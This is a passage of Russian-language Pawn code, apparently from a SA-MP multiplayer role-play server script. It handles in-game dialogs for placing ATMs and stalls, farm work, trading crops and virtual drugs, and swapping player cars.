			if(!response) return ShowPlayerDialogEx(playerid, 1884, DIALOG_STYLE_MSGBOX, "Банкоматы", "Установить объект на данное место?", "Да", "Нет");
			return EditDynamicObject(playerid,GetPVarInt(playerid,"st_object"));
		}
	case 1884:
		{
			if(!response)
			{
				DestroyDynamicObject(GetPVarInt(playerid,"st_object"));
				DeletePVar(playerid,"st_object");
				SCM(playerid,COLOR_RED," Банкомат не был установлен!");
			}
			else
			{
				new Float:x, Float:y, Float:z, Float:rz;
				GetDynamicObjectPos(GetPVarInt(playerid,"st_object"),x,y,z);
				GetDynamicObjectRot(GetPVarInt(playerid,"st_object"), rz, rz, rz);
				DeletePVar(playerid,"st_object");
				ATMInfo[TOTALATM][aX] = x;
				ATMInfo[TOTALATM][aY] = y;
				ATMInfo[TOTALATM][aZ] = z;
				ATMInfo[TOTALATM][arZ] = rz;
				LABELATM[TOTALATM] = CreateDynamic3DTextLabel("Нажмите: 'ENTER'",0x00D900FF, ATMInfo[TOTALATM][aX],ATMInfo[TOTALATM][aY],ATMInfo[TOTALATM][aZ]+1.1,10.0);
				mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_ATM"` (`aX`, `aY`, `aZ`, `arZ`) VALUES ('%f', '%f', '%f', '%f')",x, y, z, rz);
				mysql_function_query(DATABASE,QUERY,false,"","");
				TOTALATM++;
				SendMes(playerid,COLOR_GREEN," Банкомат под номером %i установлен!",TOTALATM);
			}
			return true;
		}
	case 1783:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 1784, DIALOG_STYLE_MSGBOX, "Хот доги", "Установить объект на данное место?", "Да", "Нет");
			return EditDynamicObject(playerid,GetPVarInt(playerid,"st_object"));
		}
	case 1784:
		{
			if(!response)
			{
				DestroyDynamicObject(GetPVarInt(playerid,"st_object"));
				DeletePVar(playerid,"st_object");
				SCM(playerid,COLOR_RED," Прилавок не был установлен!");
			}
			else
			{
				new Float:x, Float:y, Float:z, Float:rz;
				GetDynamicObjectPos(GetPVarInt(playerid,"st_object"),x,y,z);
				GetDynamicObjectRot(GetPVarInt(playerid,"st_object"), rz, rz, rz);
				DeletePVar(playerid,"st_object");
				StallInfo[TOTALSTALL][stPos][0] = x;
				StallInfo[TOTALSTALL][stPos][1] = y;
				StallInfo[TOTALSTALL][stPos][2] = z;
				StallInfo[TOTALSTALL][stPos][3] = rz;
				StallInfo[TOTALSTALL][stText] = CreateDynamic3DTextLabel( "Не работает", 0xFF8C37FF, StallInfo[TOTALSTALL][stPos][0], StallInfo[TOTALSTALL][stPos][1], StallInfo[TOTALSTALL][stPos][2], 8.0 );
				SendMes(playerid,COLOR_GREEN," Прилавок под номером %i установлен!",TOTALSTALL+1);
				mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_STALL"` (`pos_x`, `pos_y`, `pos_z`, `pos_r`) VALUES ('%f', '%f', '%f', '%f')",x, y, z, rz);
				mysql_function_query(DATABASE,QUERY,false,"","");
				TOTALSTALL++;
			}
			return true;
		}
	case 1344:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: SetPlayerCheckpoint(playerid, 2230.4875,-2211.9368,13.5469,5);
			case 1..5: SetPlayerCheckpoint(playerid, FarmInfo[listitem][fMenu][0], FarmInfo[listitem][fMenu][1], FarmInfo[listitem][fMenu][2],5);
			}
			CP[playerid] = 777;
			return SCM(playerid, -1, " Место на карте помечено красной меткой");
		}
	case 1203:
		{
			if(!response) {}
			else
			{
				if(GetPVarInt(GetPVarInt(playerid,"TaxiPlayer"),"PayDayCashJob") > gettime()) return true;
				if(GetPVarInt(GetPVarInt(playerid,"TaxiPlayer"),"Taxi_") <= 0) SetPVarInt(GetPVarInt(playerid,"TaxiPlayer"),"PayDayCashJob",gettime() + 150);
				if(booston == 0) PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxiexp]++;
				else if(booston == 1) PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxiexp] += 3;
				if(PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxiexp] >= PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxilvl]*8) PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxilvl]++, PlayerInfo[GetPVarInt(playerid,"TaxiPlayer")][ptaxiexp] = 0;
			}
		}
	case 1322:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0: ShowPlayerDialogEx(playerid,1356, DIALOG_STYLE_INPUT, " ","Сколько вы хотите купить зерна?", "Готово", "Отмена");
			case 1: ShowPlayerDialogEx(playerid,1357, DIALOG_STYLE_INPUT, " ","Сколько вы хотите продать зерна?", "Готово", "Отмена");
			case 2: ShowPlayerDialogEx(playerid,1358, DIALOG_STYLE_INPUT, " ","Сколько вы хотите купить урожая?", "Готово", "Отмена");
			case 3: ShowPlayerDialogEx(playerid,1359, DIALOG_STYLE_INPUT, " ","Сколько вы хотите продать урожая?", "Готово", "Отмена");
			}
		}
	case 1359:
		{
			if(!response || PlayerInfo[playerid][pJob] != 5) return true;
			if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
			if(GetPlayerVehicleID(playerid) < comptruck[0] && GetPlayerVehicleID(playerid) > comptruck[1]) return SCM(playerid,COLOR_GREY," Вы должны находиться в фургоне"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
			if(PlayerToPoint(15, playerid,1630.0807,2323.3582,10.8203) && car_prods[GetPlayerVehicleID(playerid)][0] != 0)
			{
				if(car_prods[GetPlayerVehicleID(playerid)][0] < strval(inputtext)) return SCM(playerid,COLOR_GREY," В машине недостаточно урожая");
				PlayerInfo[playerid][pCash]+=strval(inputtext)*34;
				car_prods[GetPlayerVehicleID(playerid)][0] -= strval(inputtext);
				format(YCMDstr, 124, "{FFFFFF}Склад с урожаем\n\nУрожая продано: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", strval(inputtext), strval(inputtext)*UrojSell);
				ShowPlayerDialogEx(playerid,9998,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
			}
			else if(PlayerToPoint(15, playerid,2178.3220,-1660.2120,14.9782) && car_prods[GetPlayerVehicleID(playerid)][1] != 0)
			{
				if(car_prods[GetPlayerVehicleID(playerid)][1] < strval(inputtext)) return SCM(playerid,COLOR_GREY," В машине недостаточно наркотиков");
				PlayerInfo[playerid][pCash]+=strval(inputtext)*34;
				car_prods[GetPlayerVehicleID(playerid)][1] -= strval(inputtext);
				format(YCMDstr, 124, "{FFFFFF}Наркопритон\n\nНаркотиков продано: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", strval(inputtext), strval(inputtext)*NarkSell);
				ShowPlayerDialogEx(playerid,9998,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться у места продажи урожая / наркопритона");
		}
	case 7205:
		{
			if(response)
			{
				if(CarOffer[playerid] == 999) return SCM(playerid,COLOR_GREY," Игрок отменил обмен / вам никто не предлагал обмен автомобилями");
				SendMes(playerid,COLOR_BLUE," Ждите подтверждение %s",Name(CarOffer[playerid]));
				format(YCMDstr, 256, "{FFFFFF}Вы собираетесь обменяться своим личным транспортом с %s\n\n{F1E100}Вы отдаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\n{F1E100}Вы получаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\t%i вирт\n\nВы согласны на сделку?",
				Name(playerid), VehicleNames[GetVehicleModel(house_car[CarOffer[playerid]])-400],GetVehicleModel(house_car[CarOffer[playerid]]),CarInfo[CarOffer[playerid]][carPercent][GetPVarInt(CarOffer[playerid], "chosencar")],VehicleNames[GetVehicleModel(house_car[playerid])-400],GetVehicleModel(house_car[playerid]),CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")],CarPrice[playerid]);
				ShowPlayerDialogEx(CarOffer[playerid],7206,DIALOG_STYLE_MSGBOX, "Подтверждение", YCMDstr, "Согласен", "Отмена");
				return 1;
			}
			else
			{
				SCM(playerid,COLOR_GREY," Вы отказались от сделки");
				SCM(CarOffer[playerid],COLOR_GREY," Игрок отказался от сделки");
				SetPVarInt(CarOffer[playerid],"CarOffer",9999);
				CarPrice[playerid] = 999;
				CarOffer[playerid] = 999;
				return true;
			}
		}
	case 7206:
		{
			new i = GetPVarInt(playerid,"CarOffer");
			if(response)
			{
				if(GetPVarInt(playerid,"CarOffer") == 9999) return true;
				if(!ProxDetectorS(8.0, playerid, i)) return SCM(playerid, COLOR_GREY, " Игрок должен находиться рядом с вами"), CarPrice[i] = 999, CarOffer[i] = 999, SetPVarInt(playerid,"CarOffer",9999);
				if(PlayerInfo[i][pCash] < CarPrice[i]) return SCM(playerid, COLOR_GREY, " У игрока нет столько денег"), CarPrice[i] = 999, CarOffer[i] = 999, SetPVarInt(playerid,"CarOffer",9999);
				PlayerInfo[i][pCash] -= CarPrice[i];
				PlayerInfo[playerid][pCash] += CarPrice[i];
				new previous_data, pveh = GetPVarInt(playerid, "chosencar"), iveh = GetPVarInt(i, "chosencar");
				previous_data = CarInfo[playerid][carModel][pveh];
				CarInfo[playerid][carModel][pveh] = CarInfo[i][carModel][iveh];
				CarInfo[i][carModel][iveh] = previous_data;
				previous_data = CarInfo[playerid][carColor_one][pveh];
				CarInfo[playerid][carColor_one][pveh] = CarInfo[i][carColor_one][iveh];
				CarInfo[i][carColor_one][iveh] = previous_data;
				previous_data = CarInfo[playerid][carColor_two][pveh];
				CarInfo[playerid][carColor_two][pveh] = CarInfo[i][carColor_two][iveh];
				CarInfo[i][carColor_two][iveh] = previous_data;
				previous_data = CarInfo[playerid][carPercent][pveh];
				CarInfo[playerid][carPercent][pveh] = CarInfo[i][carPercent][iveh];
				CarInfo[i][carPercent][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_1][pveh];
				CarInfo[playerid][carVehcom_1][pveh] = CarInfo[i][carVehcom_1][iveh];
				CarInfo[i][carVehcom_1][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_2][pveh];
				CarInfo[playerid][carVehcom_2][pveh] = CarInfo[i][carVehcom_2][iveh];
				CarInfo[i][carVehcom_2][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_3][pveh];
				CarInfo[playerid][carVehcom_3][pveh] = CarInfo[i][carVehcom_3][iveh];
				CarInfo[i][carVehcom_3][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_4][pveh];
				CarInfo[playerid][carVehcom_4][pveh] = CarInfo[i][carVehcom_4][iveh];
				CarInfo[i][carVehcom_4][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_5][pveh];
				CarInfo[playerid][carVehcom_5][pveh] = CarInfo[i][carVehcom_5][iveh];
				CarInfo[i][carVehcom_5][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_6][pveh];
				CarInfo[playerid][carVehcom_6][pveh] = CarInfo[i][carVehcom_6][iveh];
				CarInfo[i][carVehcom_6][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_7][pveh];
				CarInfo[playerid][carVehcom_7][pveh] = CarInfo[i][carVehcom_7][iveh];
				CarInfo[i][carVehcom_7][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_8][pveh];
				CarInfo[playerid][carVehcom_8][pveh] = CarInfo[i][carVehcom_8][iveh];
				CarInfo[i][carVehcom_8][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_9][pveh];
				CarInfo[playerid][carVehcom_9][pveh] = CarInfo[i][carVehcom_9][iveh];
				CarInfo[i][carVehcom_9][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_10][pveh];
				CarInfo[playerid][carVehcom_10][pveh] = CarInfo[i][carVehcom_10][iveh];
				CarInfo[i][carVehcom_10][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_11][pveh];
				CarInfo[playerid][carVehcom_11][pveh] = CarInfo[i][carVehcom_11][iveh];
				CarInfo[i][carVehcom_11][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_12][pveh];
				CarInfo[playerid][carVehcom_12][pveh] = CarInfo[i][carVehcom_12][iveh];
				CarInfo[i][carVehcom_12][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_13][pveh];
				CarInfo[playerid][carVehcom_13][pveh] = CarInfo[i][carVehcom_13][iveh];
				CarInfo[i][carVehcom_13][iveh] = previous_data;
				previous_data = CarInfo[playerid][carVehcom_14][pveh];
				CarInfo[playerid][carVehcom_14][pveh] = CarInfo[i][carVehcom_14][iveh];
				CarInfo[i][carVehcom_14][iveh] = previous_data;
				previous_data = house_car[playerid];
				house_car[playerid] = house_car[i];
				house_car[i] = previous_data;
				SendMes(playerid,0x6495EDFF," Вы обменялись автомобилями с %s",PlayerInfo[i][pName]);
				SendMes(i, 0x6495EDFF," Вы обменялись автомобилями с %s",PlayerInfo[playerid][pName]);
				CarPrice[i] = 999;
				CarOffer[i] = 999;
				new house = PlayerInfo[playerid][pPHouseKey];
				new houses = PlayerInfo[i][pPHouseKey];
				DestroyVehicle(house_car[playerid]);
				house_car[playerid] = -1;
				if(HGet(playerid)) house_car[playerid] = CreateVehicle(CarInfo[playerid][carModel][pveh], HouseInfo[house][hCarx], HouseInfo[house][hCary], HouseInfo[house][hCarz], HouseInfo[house][hCarc] , CarInfo[playerid][carColor_one][pveh] ,CarInfo[playerid][carColor_two][pveh], 86400);
				DestroyVehicle(house_car[i]);
				house_car[i] = -1;
				if(HGet(i)) house_car[i] = CreateVehicle(CarInfo[i][carModel][iveh], HouseInfo[houses][hCarx], HouseInfo[houses][hCary], HouseInfo[houses][hCarz], HouseInfo[houses][hCarc] , CarInfo[i][carColor_one][iveh] ,CarInfo[i][carColor_two][iveh], 86400);
				SetPVarInt(playerid,"CarOffer",9999);
				return true;
			}
			else
			{
				SCM(playerid,COLOR_GREY," Вы отказались от сделки");
				SCM(i,COLOR_GREY," Игрок отказался от сделки");
				CarPrice[i] = 999;
				CarOffer[i] = 999;
				SetPVarInt(playerid,"CarOffer",9999);
				return true;
			}
		}
	case 1358:
		{
			if(!response || PlayerInfo[playerid][pJob] != 5) return true;
			if(!strlen(inputtext) || strval(inputtext) < 0) return SCM(playerid,COLOR_GREY," Неверное количество!");
			if(GetPlayerVehicleID(playerid) < comptruck[0] || GetPlayerVehicleID(playerid) > comptruck[1]) return SCM(playerid,COLOR_GREY," Вы должны находиться в фургоне"), RemovePlayerFromVehicleAC(playerid);
			if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
			new null = -1;
			for(new i = 0; i <= TOTALFARM; i++) if(PlayerToPoint(15, playerid,FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) null = i;
			if(null == -1) return SCM(playerid,COLOR_GREY," Вы должны находиться возле фермы");
			if(strcmp(FarmInfo[null][fOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У фермы нет владельца");
			if(FarmInfo[null][fProds] < strval(inputtext)) return SCM(playerid,COLOR_GREY," На складе фермы недостаточно урожая");
			if(PlayerInfo[playerid][pCash] < strval(inputtext)*FarmInfo[null][fProds_Price]) return SCM(playerid,COLOR_GREY," Недостаточно средств");
			switch(FarmInfo[null][fProds_Selling])
			{
			case 1:
				{
					if(strval(inputtext) > 10000-car_prods[GetPlayerVehicleID(playerid)][0]) return SCM(playerid,COLOR_GREY," В машине не хватает места");
					car_prods[GetPlayerVehicleID(playerid)][0] += strval(inputtext);
					format(YCMDstr, 124, "{FFFFFF}Ферма номер: {B41010}%i\n\n{FFFFFF}Урожая куплено: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", null-1, strval(inputtext),strval(inputtext)*FarmInfo[null][fProds_Price]);
					ShowPlayerDialogEx(playerid,0,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
					SCM(playerid,COLOR_GREEN," Вы можете продать урожай на склад {FFFFFF}(( /gps >> [1] По работе >> [3] Склад для урожая с ферм ))");
					SendMes(playerid,TEAM_GROVE_COLOR," Зерна в машине: %i / 1000",car_grain[GetPlayerVehicleID(playerid)][0]);
					SendMes(playerid,TEAM_GROVE_COLOR," Урожая в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][0]);
					SendMes(playerid,TEAM_GROVE_COLOR," Наркотиков в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
				}
			case 2:
				{
					if(strval(inputtext) > 10000-car_prods[GetPlayerVehicleID(playerid)][1]) return SCM(playerid,COLOR_GREY," В машине не хватает места");
					car_prods[GetPlayerVehicleID(playerid)][1] += strval(inputtext);
					format(YCMDstr, 124, "{FFFFFF}Ферма номер: {B41010}%i\n\n{FFFFFF}Наркотиков куплено: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", null-1, strval(inputtext),strval(inputtext)*FarmInfo[null][fProds_Price]);
					ShowPlayerDialogEx(playerid,9999,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
					SCM(playerid,COLOR_GREEN," Вы можете продать наркотики в притон {FFFFFF}(( /gps >> [1] Важное >> [7] Наркопритон ))");
					SendMes(playerid,TEAM_GROVE_COLOR," Зерна в машине: %i / 1000",car_grain[GetPlayerVehicleID(playerid)][0]);
					SendMes(playerid,TEAM_GROVE_COLOR," Урожая в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][0]);
					SendMes(playerid,TEAM_GROVE_COLOR," Наркотиков в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
				}
			}
			FarmStatPay[null][5] += strval(inputtext);
			FarmStatDay[null][5] += strval(inputtext);
			PlayerInfo[playerid][pCash]-=strval(inputtext)*FarmInfo[null][fProds_Price];
			FarmStatPay[null][8] += strval(inputtext)*FarmInfo[null][fProds_Price];
			FarmStatDay[null][8] += strval(inputtext)*FarmInfo[null][fProds_Price];
			return FarmInfo[null][fBank]+=strval(inputtext)*FarmInfo[null][fProds_Price];
		}
	case 1357:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[0] && newcar <= comptruck[1])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(GetPlayerVehicleID(playerid) < comptruck[0] || GetPlayerVehicleID(playerid) > comptruck[1]) return SCM(playerid,COLOR_GREY," Вы должны находиться в фургоне"), RemovePlayerFromVehicleAC(playerid);
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				if(!strlen(inputtext) || strval(inputtext) < 0 || strval(inputtext) > car_grain[GetPlayerVehicleID(playerid)][0]) return SCM(playerid,COLOR_GREY," В автомобиле недостаточно зерна!");
				new null = 0;
				for(new i = 0; i <= TOTALFARM; i++) if(PlayerToPoint(15, playerid,FarmInfo[i][fMenu][0], FarmInfo[i][fMenu][1], FarmInfo[i][fMenu][2])) null = i;
				if(!null) return SCM(playerid,COLOR_GREY," Вы должны находиться возле фермы");
				if(strcmp(FarmInfo[null][fOwner],"None",true) == 0) return SCM(playerid,COLOR_GREY," У фермы нет владельца");
				if(FarmInfo[null][fGrain]+strval(inputtext) > 10000) return SCM(playerid,COLOR_GREY," На ферме достаточно зерна");
				if(FarmInfo[null][fBank] < strval(inputtext)*FarmInfo[null][fGrain_Price]) return SCM(playerid,COLOR_GREY," На балансе фермы недостаточно денег");
				FarmInfo[null][fBank]-=strval(inputtext)*FarmInfo[null][fGrain_Price];
				FarmStatPay[null][6] += strval(inputtext)*FarmInfo[null][fGrain_Price];
				FarmStatDay[null][6] += strval(inputtext)*FarmInfo[null][fGrain_Price];
				FarmInfo[null][fGrain]+=strval(inputtext);
				PlayerInfo[playerid][pCash]+=strval(inputtext)*FarmInfo[null][fGrain_Price];
				car_grain[GetPlayerVehicleID(playerid)][0]-=strval(inputtext);
				FarmStatPay[null][4] += strval(inputtext);
				FarmStatDay[null][4] += strval(inputtext);
				format(YCMDstr, 124, "{FFFFFF}Ферма номер: {B41010}%i\n\n{FFFFFF}Зерна продано: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", null-1, strval(inputtext),strval(inputtext)*FarmInfo[null][fGrain_Price]);
				ShowPlayerDialogEx(playerid,9998,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
				return true;
			}
		}
	case 1346:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[0] && newcar <= comptruck[1])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return RemovePlayerFromVehicleAC(playerid);
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				car_grain[GetPlayerVehicleID(playerid)][1] = 0;
				car_grain[GetPlayerVehicleID(playerid)][2] = 0;
				DestroyDynamicPickup(car_pickup[GetPlayerVehicleID(playerid)]);
				DestroyDynamic3DTextLabel(car_text[GetPlayerVehicleID(playerid)]);
				car_pickup[GetPlayerVehicleID(playerid)] = 0;
				if(PlayerInfo[playerid][pCash] < (car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2])*4) return SCM(playerid,COLOR_GREY," Недостаточно средств!"), car_grain[GetPlayerVehicleID(playerid)][0] = car_grain[GetPlayerVehicleID(playerid)][2];
				PlayerInfo[playerid][pCash] -= (car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2])*4;
				format(YCMDstr, 124, "{FFFFFF}Склад с зерном\n\nЗерна куплено: {0C9599}%i\n{FFFFFF}Цена: {0C9599}%i вирт", car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2], (car_grain[GetPlayerVehicleID(playerid)][0]-car_grain[GetPlayerVehicleID(playerid)][2])*ZernBuy);
				ShowPlayerDialogEx(playerid,9997,DIALOG_STYLE_MSGBOX, " ", YCMDstr, "Закрыть", "");
				SendMes(playerid,TEAM_GROVE_COLOR," Зерна в машине: %i / 1000",car_grain[GetPlayerVehicleID(playerid)][0]);
				SendMes(playerid,TEAM_GROVE_COLOR," Урожая в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][0]);
				SendMes(playerid,TEAM_GROVE_COLOR," Наркотиков в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
				SCM(playerid,COLOR_GREEN," Загрузка зерна завершена. Вы можете продать зерно на ферму {FFFFFF}(( /gps >> [5] Фермы ))");
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в фургоне"), RemovePlayerFromVehicleAC(playerid);
		}
	case 1356:
		{
			new newcar = GetPlayerVehicleID(playerid);
			if(newcar >= comptruck[0] && newcar <= comptruck[1])
			{
				if(!response || PlayerInfo[playerid][pJob] != 5) return true;
				if(GetPVarInt(playerid,"rentcar_job") != GetPlayerVehicleID(playerid)) return SCM(playerid,COLOR_GREY," Это не ваш автомобиль!");
				if(!strlen(inputtext) || strval(inputtext) > 1000 || strval(inputtext) < 50) return ShowPlayerDialogEx(playerid,1356, DIALOG_STYLE_INPUT, "Загрузка зерна","Введите количество зерна на загрузку", "Ок", "Отмена"), SCM(playerid, COLOR_GREY, " Минимальное количество зерна - 50, максимальное - 1000");
				if(car_grain[GetPlayerVehicleID(playerid)][0]+strval(inputtext) > 1000) return SCM(playerid,COLOR_GREY," Грузовик полон!");
				if(!PlayerToPoint(10.0,playerid,2191.9878,-2262.4209,13.6586)) return SCM(playerid,COLOR_GREY," В данном месте нельзя заказать продукты");
				if(PlayerInfo[playerid][pCash] < strval(inputtext)*4) return SCM(playerid, COLOR_GREY," У вас не хватает денег!");
				new Float:x, Float:y, Float:z;
				GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPlayerVehicleID(playerid),false,false,false,doors,false,false,false);
				SetVehicleVelocity(GetPlayerVehicleID(playerid), 0.0, 0.0, 0.0);
				GetVehiclePos(GetPlayerVehicleID(playerid), x, y, z);
				GetXYInBackOfPlayer(playerid, x, y,3.5);
				car_pickup[GetPlayerVehicleID(playerid)] = CreatePickupAC(19197,23,x,y,z+0.5);
				car_grain[GetPlayerVehicleID(playerid)][1] = strval(inputtext);
				car_grain[GetPlayerVehicleID(playerid)][2] = car_grain[GetPlayerVehicleID(playerid)][0];
				format(string, 32, "Загружено\n{ffffff}%i / %i",car_grain[GetPlayerVehicleID(playerid)][0], car_grain[GetPlayerVehicleID(playerid)][1]);
				car_text[GetPlayerVehicleID(playerid)] = CreateDynamic3DTextLabel(string,0x5CABBDAA,x,y,z+1,15.0);
				SCM(playerid, 0x0073B7AA, " Машина на месте. Теперь вы и грузчики могут загружать ее");
				SCM(playerid, 0x0073B7AA, " Если решите завершить загрузку, сядьте снова в машину");
				RemovePlayerFromVehicleAC(playerid);
				return true;
			}
			else return SCM(playerid,COLOR_GREY," Вы должны находиться в фургоне");
		}
	case 1345:
		{
			if(!response || !GetPlayerVehicleID(playerid) || !GetPVarInt(playerid,"farm_id")) return true;
			new car, rand;
			for(new i = 0; i <= TOTALFARM; i++) if(GetPlayerVehicleID(playerid) >= FarmInfo[i][fSeed_Car][0] && GetPlayerVehicleID(playerid) <= FarmInfo[i][fSeed_Car][1]) car++;
			if(car == 0) return Kick(playerid);
			car = GetPlayerVehicleID(playerid);
			if(!Farmcar_works[car])
			{
				switch(GetPVarInt(playerid,"farm_id"))
				{
				case 1: rand = random(4), SetPlayerRaceCheckpoint(playerid,1,Farmcar_coord_one[rand][0],Farmcar_coord_one[rand][1],Farmcar_coord_one[rand][2],0,0,0,5.0);
				case 2: rand = random(4), SetPlayerRaceCheckpoint(playerid,1,Farmcar_coord_two[rand][0],Farmcar_coord_two[rand][1],Farmcar_coord_two[rand][2],0,0,0,5.0);
				case 3: rand = random(4), SetPlayerRaceCheckpoint(playerid,1,Farmcar_coord_three[rand][0],Farmcar_coord_three[rand][1],Farmcar_coord_three[rand][2],0,0,0,5.0);
				case 4: rand = random(4), SetPlayerRaceCheckpoint(playerid,1,Farmcar_coord_four[rand][0],Farmcar_coord_four[rand][1],Farmcar_coord_four[rand][2],0,0,0,5.0);
				case 5: rand = random(4), SetPlayerRaceCheckpoint(playerid,1,Farmcar_coord_five[rand][0],Farmcar_coord_five[rand][1],Farmcar_coord_five[rand][2],0,0,0,5.0);
				}
				SetPVarInt(playerid,"farm_status",3);
			}
			else
			{
				Delete3DTextLabel(Farmcar_text[car]);
				DestroyDynamicPickup(Farmcar_pickup[car]);
				Farmcar_pickup[car] = 0;
				DeletePVar(playerid,"farm_status");
				if(Farmcar_prods[car] > 1000) Farmcar_prods[car] = 1000;
				RemovePlayerAttachedObject(playerid,3);
				DisablePlayerCheckpoint(playerid);
				Farmcar_works[car] = false;
				format(string, sizeof(string), " {00AB06}Урожая в машине: %d / 1000",Farmcar_prods[car]);
				SCM(playerid, COLOR_GREEN,string);
				SCM(playerid,0x0073B7AA," Сбор урожая завершен.Теперь направляйтесь к ферме и разгрузитесь {FFFFFF}(( Командой /funload ))");
			}
			return true;
		}
	case 150:
		{
			if(response)
			{
				new farm;
				if(GetPVarInt(playerid,"Fraction_Duty")) return SCM(playerid,COLOR_GREY," Вы состоите в организации");
				if(GetPVarInt(playerid,"farm_id") || Works[playerid])return SCM(playerid,COLOR_GREY," Вы уже начали работу");
				for(new i = 0; i <= TOTALFARM; i++) if(IsPlayerInRangeOfPoint(playerid,20.0,FarmInfo[i][fCloakroom][0],FarmInfo[i][fCloakroom][1], FarmInfo[i][fCloakroom][2])) farm = i;
				if(!farm) return SCM(playerid,COLOR_GREY," Вы должны находиться возле раздевалки у фермы!");
				if(FGet(playerid) && PlayerInfo[playerid][pPFarmKey] == farm)
				{
					SetPVarInt(playerid,"farm_rank",4);
					switch(PlayerInfo[playerid][pSex]) { case 1: SetPlayerSkin(playerid,34); default: SetPlayerSkin(playerid,31); }
				}
				else if(GetFarmjob(playerid,farm) == 2)
				{
					SetPVarInt(playerid,"farm_rank",3);
					switch(PlayerInfo[playerid][pSex]) { case 1: SetPlayerSkin(playerid,161); default: SetPlayerSkin(playerid,198); }
				}
				else if(GetFarmjob(playerid,farm))
				{
					SetPVarInt(playerid,"farm_rank",2);
					FarmStatPay[farm][1] ++;
					FarmStatDay[farm][1] ++;
					switch(PlayerInfo[playerid][pSex]) { case 1: SetPlayerSkin(playerid,158); default: SetPlayerSkin(playerid,157); }
				}
				else
				{
					SetPVarInt(playerid,"farm_rank",1);
					FarmStatPay[farm][0] ++;
					FarmStatDay[farm][0] ++;
					switch(PlayerInfo[playerid][pSex]) { case 1: SetPlayerSkin(playerid,132); default: SetPlayerSkin(playerid,131); }
				}
				SetPVarInt(playerid,"farm_id",farm);
				DeletePVar(playerid,"farm_status");
			}
			else
			{
				new farm;
				if(!GetPVarInt(playerid,"farm_id"))return SCM(playerid,COLOR_GREY," Вы не начинали работу");
				for(new i = 0; i <= TOTALFARM; i++) if(IsPlayerInRangeOfPoint(playerid,20.0,FarmInfo[i][fCloakroom][0],FarmInfo[i][fCloakroom][1], FarmInfo[i][fCloakroom][2])) farm = i;
				if(!farm) return SCM(playerid,COLOR_GREY," Вы должны находиться возле раздевалки у фермы!");
				if(GetPVarInt(playerid,"farm_id") != farm) return SCM(playerid,COLOR_GREY," Вы не начинали работу на данной ферме!");
				PlayerInfo[playerid][pCash] += GetPVarInt(playerid,"farm_zp");
